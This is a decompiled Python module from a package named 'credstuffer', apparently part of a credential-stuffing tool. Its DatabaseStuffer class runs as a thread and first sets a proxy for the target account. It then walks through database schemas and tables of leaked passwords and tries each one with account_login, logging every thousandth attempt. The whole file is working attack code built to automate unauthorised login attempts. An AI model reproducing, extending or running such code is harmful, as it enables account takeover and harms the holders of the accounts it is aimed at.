# uncompyle6 version 3.6.7
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.8.2 (tags/v3.8.2:7b3ab59, Feb 25 2020, 23:03:10) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: build/bdist.linux-x86_64/egg/credstuffer/database_stuffer.py
# Compiled at: 2020-04-05 08:14:43
# Size of source mod 2**32: 2256 bytes
import logging, threading
from time import sleep
from credstuffer.dbhandler import DBHandler
from credstuffer.stuffer import Stuffer

class DatabaseStuffer(Stuffer, threading.Thread):
    """DatabaseStuffer"""

    def __init__(self, account, schemas='abcdefghijklmnopqrstuvwxyz', tables='abcdefghijklmnopqrstuvwxyz', **dbparams):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('create class DatabaseStuffer')
        Stuffer.__init__(self, account=account)
        threading.Thread.__init__(self)
        self.dbparams = dbparams
        self.dbhandler = DBHandler(**self.dbparams)
        self.schema_list = list(schemas)
        self.table_list = list(tables)

    def run(self) -> None:
        """ executes the run thread for account logins """
        self.set_account_proxy()
        for schema_char in self.schema_list:
            for table_char in self.table_list:
                if schema_char == 'symbols':
                    self.logger.info('fetch data from {}.{}'.format(schema_char, schema_char))
                    passwords_data = self.dbhandler.fetch_data(schema=schema_char, table=schema_char)
                else:
                    self.logger.info('fetch data from {}.{}'.format(schema_char, table_char))
                    passwords_data = self.dbhandler.fetch_data(schema=schema_char, table=table_char)
                for row, entry in enumerate(passwords_data):
                    if entry[0]:
                        password = entry[0]
                        self.account_login(password=password)
                        if row % 1000 == 0:
                            self.logger.info('Database row {} with password {}'.format(row, password))